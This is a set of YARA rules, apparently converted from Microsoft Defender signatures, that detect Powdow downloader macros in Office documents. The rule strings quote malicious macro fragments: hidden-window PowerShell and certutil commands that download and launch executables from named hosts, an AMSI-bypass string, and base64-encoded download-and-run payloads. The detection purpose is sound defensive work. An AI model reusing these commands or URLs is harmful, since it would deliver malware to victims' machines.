rule TrojanDownloader_O97M_Powdow_DD_2147838231_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DD!MTB"
        threat_id = "2147838231"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "motive=xy+yt+z+d+e+l+k+t+xtendfunctionfunctionauto_open()setsurethingsearch=getobject(" ascii //weight: 1
        $x_1_2 = ":msgbox\"microsoftofficeerror\":surethingsearch.execmotiveendfunction" ascii //weight: 1
        $x_1_3 = "functionxy()asstringxy=surething.multi.tagendfunctionfunctionyt()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KF_2147839438_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KF!MTB"
        threat_id = "2147839438"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Invoke-WebRequest -Uri \"\"http://3.65.2.139/read/Booking-02.exe\"\" -OutFile " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KG_2147839439_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KG!MTB"
        threat_id = "2147839439"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Invoke-WebRequest -Uri \"\"http://3.65.2.139/read/Ltrwmpfgvbk.exe\"\" -OutFile" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DPL_2147839471_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DPL!MTB"
        threat_id = "2147839471"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=shell(\"cmd/ccertutil.exe-urlcache-split-f\"\"https://olugun.co.za/home/micors.scr\"\"rrwcjfjgup.exe.exe&&rrwcjfjgup.exe.exe\",vbhide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STT_2147839501_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STT!MTB"
        threat_id = "2147839501"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set a = fs.CreateTextFile(\"C:\\Users\\\" & Application.UserName & \"\\Documents\\inv.vbs\", True)" ascii //weight: 1
        $x_1_2 = "a.WriteLine (\"CreateObject(\" & Chr(34) & \"Wscript.Shell\" & Chr(34) & \").Run \" & Chr(34) & Chr(34) & Chr(34) & Chr(34) & \" & WScript.Arguments(0) & \" & Chr(34) & Chr(34) & Chr(34) & Chr(34) & \", 0, False\")" ascii //weight: 1
        $x_1_3 = "b.WriteLine (\"cd C:\\Sys32 && powershell -command \" & Chr(34) & \"Invoke-WebRequest -Uri 'https://cdn-131.anonfiles.com/jbN3p9Tfy4/0ba752fe-1674397444/HULD6ahu59QR4PHB.zip' -OutFile untitled.zip\" & Chr(34))" ascii //weight: 1
        $x_1_4 = "b.WriteLine (\"powershell -command \" & Chr(34) & \"expand-archive -path 'untitled.zip'\")" ascii //weight: 1
        $x_1_5 = "b.WriteLine (\"wscript \" & Chr(34) & \"C:\\Sys32\\inv.vbs\" & Chr(34) & \" C:\\Sys32\\untitled\\Untitled.bat\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STU_2147839647_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STU!MTB"
        threat_id = "2147839647"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell -WindowStyle hidden -executionpolicy bypass;" ascii //weight: 1
        $x_1_2 = "Invoke-WebRequest -Uri \"\"https://transfer.sh/get/BI6zAG/Pxroc.exe\"\" -OutFile $TempFile;" ascii //weight: 1
        $x_1_3 = "oWshShellExec = oWshShell.Exec(sCommand)" ascii //weight: 1
        $x_1_4 = "sOutput = oWshShellExec.StdOut.ReadAll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STV_2147840238_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STV!MTB"
        threat_id = "2147840238"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell -WindowStyle hidden -executionpolicy bypass;" ascii //weight: 1
        $x_1_2 = "Invoke-WebRequest -Uri \"\"https://officerepresentative.com/xls/TC%201%20AHTSA%201093%201094%20RO.scr\"\" -OutFile $TempFile;" ascii //weight: 1
        $x_1_3 = "Set oWshShellExec = oWshShell.Exec(sCommand)" ascii //weight: 1
        $x_1_4 = "sOutput = oWshShellExec.StdOut.ReadAll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STW_2147842517_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STW!MTB"
        threat_id = "2147842517"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell -WindowStyle hidden -executionpolicy bypass;" ascii //weight: 1
        $x_1_2 = "Invoke-WebRequest -Uri \"\"https://mindfree.co.za/1/Recrypted.pif\"\" -OutFile $TempFile; Start-Process $TempFile;" ascii //weight: 1
        $x_1_3 = "Set oWshShellExec = oWshShell.Exec(sCommand)" ascii //weight: 1
        $x_1_4 = "sOutput = oWshShellExec.StdOut.ReadAll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STX_2147850398_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STX!MTB"
        threat_id = "2147850398"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell -WindowStyle hidden -executionpolicy bypass;" ascii //weight: 1
        $x_1_2 = "Invoke-WebRequest -Uri \"\"http://62.233.57.190/z1/PTT_20230707-WA01120xlsx.exe\"\" -OutFile $TempFile; Start-Process $TempFile;" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STY_2147850399_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STY!MTB"
        threat_id = "2147850399"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell -WindowStyle hidden -executionpolicy bypass; " ascii //weight: 1
        $x_1_2 = "Invoke-WebRequest -Uri \"\"https://afrikanist-work.co.za/DDD.exe\"\" -OutFile $TempFile; Start-Process $TempFile;" ascii //weight: 1
        $x_1_3 = "Set HeckrynvsExec = Heckrynvs.Exec(Nhjis)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SSA_2147850400_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SSA!MTB"
        threat_id = "2147850400"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell -WindowStyle hidden -executionpolicy bypass;" ascii //weight: 1
        $x_1_2 = "Invoke-WebRequest -Uri \"\"https://bataung.co.za/realdeal.exe\"\" -OutFile $TempFile; Start-Process $TempFile;" ascii //weight: 1
        $x_1_3 = "Set ZvozzgExec = Zvozzg.Exec(Xeeacrcty)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SSB_2147851123_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SSB!MTB"
        threat_id = "2147851123"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;" ascii //weight: 1
        $x_1_2 = "In^vo*ke-We^bRe*quest -U^ri \"\"http://62.233.57.190/z1/quote111.exe\"\" -Out*File $TempFile; St*art-Proce*ss $TempFile;" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SSC_2147892148_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SSC!MTB"
        threat_id = "2147892148"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell \"PowerShell -nop -exec bypass -w hidden -Enc DQAKAGYAbwByACgAJABpAD0AMQA7ACQAaQAgAC0AbABlACAAMQAwADAAOwAkAGkAKwArACkADQAKAHsADQAKAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHc" ascii //weight: 1
        $x_1_2 = "AbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAbABhAGMAawAtAHMAdQBuAC0AYQAzADMANQAuAGEAcwB5AG8AcgBmAHAAbABtAG4AdgAuAHcAbwByAGsAZQByAHMALgBkAGUAdgAvAG0AbgB3AE8ARABCAHAAdABLADYAag" ascii //weight: 1
        $x_1_3 = "BVAC8AegBLAEoARgBuAGIAbgB6AGUAdQBtADgALwAzADcAZAA0AGYAZABkAGIANgBiAGYAMgBkAGUANgA2ADEAMQBjADYANgA1ADUAYQA1AGMAZAAzADcAOQA3ADIAZgBjADMAMwA2ADQAMgBkAC8AYQBjAGUALgBqAHAAZwAnACkAOwBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAzADAADQAKAH0ADQAKAA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KM_2147893910_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KM!MTB"
        threat_id = "2147893910"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ImagemSimplesCDT = \"https://www.4sync.com/web/directDownload/NRrKch5Y/cmlUXrEx.ec6924e67c8d2c0fb427df950869232a\"" ascii //weight: 1
        $x_1_2 = "URLDownloadToFile 0, ImagemSimplesCDT, RenanCDT & \"document.exe\", 0, 0" ascii //weight: 1
        $x_1_3 = "M_S = PDf_1 + PDf_CDT" ascii //weight: 1
        $x_1_4 = "INGRIDCDT = PDf_2 + PDf_3" ascii //weight: 1
        $x_1_5 = "Shell (M_S + INGRIDCDT + M_S1 + M_S2 + M_S3), 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KN_2147897638_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KN!MTB"
        threat_id = "2147897638"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ImagemSimplesCDT = \"https://www.4sync.com/web/directDownload/gEkf94Ur/eojFdJ6R.a6c0638b3829723971b5295781e1abc4\"" ascii //weight: 1
        $x_1_2 = "URLDownloadToFile 0, ImagemSimplesCDT, MasterCDT & \"document.vbs\", 0, 0" ascii //weight: 1
        $x_1_3 = "Rena = objeto_download_1 + objeto_download_2 + objeto_download_3 + objeto_download_4 + objeto_download_5" ascii //weight: 1
        $x_1_4 = "Set a = CreateObject(INSEUR_CDF)" ascii //weight: 1
        $x_1_5 = "a.Run (M_S + TOGACDT + M_S1 + M_S2 + M_S3), 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SCS_2147899440_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SCS!MTB"
        threat_id = "2147899440"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(okoak)" ascii //weight: 1
        $x_1_2 = "FBS.copyfile adoo, Environ$(jaluka) & \"\\lo\" + \"ve.co\" + String(1, \"m\"), True" ascii //weight: 1
        $x_1_3 = "= Split(\"keioakkjekeioakkjekeioakkjekeioakkjekeioakkjekeioakkjekeioakkjekeioakkje" ascii //weight: 1
        $x_1_4 = {3d 20 4a 6f 69 6e 28 63 6f 6f 70 65 72 2c 20 22 22 29 20 2b 20 69 64 63 61 72 64 73 20 2b 20 22 ?? ?? 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KO_2147904676_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KO!MTB"
        threat_id = "2147904676"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 74 72 55 52 4c 20 3d 20 22 68 74 74 70 73 3a 2f 2f 31 30 37 2e 31 37 35 2e 33 2e 31 30 2f 55 73 65 72 73 2f 53 65 72 65 6e 65 5f 4d 69 6e 64 73 5f 32 30 32 34 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? (30|2d|39) (30|2d|39) 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = "objHTTP.Open \"GET\", strURL, False" ascii //weight: 1
        $x_1_3 = "With CreateObject(\"ADODB.Stream\")" ascii //weight: 1
        $x_1_4 = "Call Shell(strFile, vbNormalFocus)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SYU_2147905819_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SYU!MTB"
        threat_id = "2147905819"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Open \"get\", \"https://adfhjiuyqnmahdfiuad.com/index.php\", False" ascii //weight: 1
        $x_1_2 = "Document.LoadXML dOcuMeNtXMl.responseText" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VRB_2147906447_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VRB!MTB"
        threat_id = "2147906447"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = "( 'https://pt.textbin.net/download/itm1dkgz7c' )" ascii //weight: 1
        $x_1_3 = "wscript.exe x.vbs" ascii //weight: 1
        $x_1_4 = "Call Shell(\"powershell.exe -command \" & gIrNo & \" ; exit \", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_NET_2147909851_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.NET!MTB"
        threat_id = "2147909851"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "url='https://nsoftonline.com/mcr/shiparticulars.exe'" ascii //weight: 1
        $x_1_2 = "powershell.exe -ExecutionPolicy Bypass -Command " ascii //weight: 1
        $x_1_3 = "='C:\\Users\\USER\\Documents\\shiparticulars.exe'; Invoke-WebRequest" ascii //weight: 1
        $x_1_4 = "Start-Process -FilePath $output -NoNewWindow -Wait" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SIO_2147910890_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SIO!MTB"
        threat_id = "2147910890"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "objShell.Run tempPath & \"\\kronos.bat\", 0, False" ascii //weight: 1
        $x_1_2 = "downloadURL = \"https://valami.hu\"" ascii //weight: 1
        $x_1_3 = "objFile.WriteLine \"curl -o \"\"%downloadedFile%\"\" -L \"\"%downloadURL%\"\"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SIK_2147915217_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SIK!MTB"
        threat_id = "2147915217"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"^pP\" + \"Z^D^J^D\" + \"^b/^moc\" + \".^ht\" + \"la^eh\" + \"^or\" + \"^pofn\" + \"i//:p\" + \"t^t^h^@\" + \"^\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SSD_2147920980_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SSD!MTB"
        threat_id = "2147920980"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Powershell -C $FEIfwuioehfaiwyYOETWTRuwye = 'a'+'ms'+'iI'+'ni'+'tF'+'a'; $EF8034uowieypowiue = 'il'+'ed'; $Ceoiuwjoeuyfw = 'Sy'+'st'+'em.Ma'+'na'+'gem'+'ent.'+'Aut'+'omat'+'io'+'n.A'+'ms'+'iUt'+'ils';" ascii //weight: 1
        $x_1_2 = "[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('JFVVVSA9ICdodHRwczovL2V4cGVydHByb21vdGlvbnMucnUvZmlsZXMvc3ZjLmV4ZSc7ICRQUFAgPSAnQzpcVXNlcnNcUHVibGljXHN2Yy5leGUnOyAkV1dXID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWV" ascii //weight: 1
        $x_1_3 = "udDsgJFdXVy5Eb3dubG9hZEZpbGUoJFVVVSwgJFBQUCk7IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRQUFA7')); $CCC = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($BBB)); powershell -E $CCC;" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_VRA_2147923969_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VRA!MTB"
        threat_id = "2147923969"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "dABwADoALwAvAHMAYQBiAGkAbgBmAGwAbwByAGkAbgAuAGQAZA" ascii //weight: 1
        $x_1_2 = "BuAHMALgBuAGUAdAA6ADQANAA0ADQALwBkAG8AdwBuAGwAbwBh" ascii //weight: 1
        $x_1_3 = "AGQALwBjAHMAaABhAHIAcAAvACIAKQA7ACQAYQBzAHMAZQBtAG" ascii //weight: 1
        $x_1_4 = "asd = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_5 = "asd.Run (SEGc)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCK_2147924080_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCK!MTB"
        threat_id = "2147924080"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell-e$c;\"program=shell(cmdstr,vbhide)application.screenupdating=trueendsub" ascii //weight: 1
        $x_1_2 = "autoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCM_2147927943_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCM!MTB"
        threat_id = "2147927943"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {74 74 70 3a 2f 2f 35 32 35 37 35 38 31 35 2d 33 38 2d 32 30 32 30 30 34 30 36 31 32 30 36 33 34 2e 77 65 62 73 74 61 72 74 65 72 7a 2e 63 6f 6d 2f ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2e ?? ?? ?? 22}  //weight: 1, accuracy: Low
        $x_1_2 = {64 73 74 72 66 69 6c 65 3d 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2e ?? ?? ?? 22}  //weight: 1, accuracy: Low
        $x_1_3 = "callshell(strfile,vbnormalfocus)elseendifendsub" ascii //weight: 1
        $x_1_4 = "subautoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

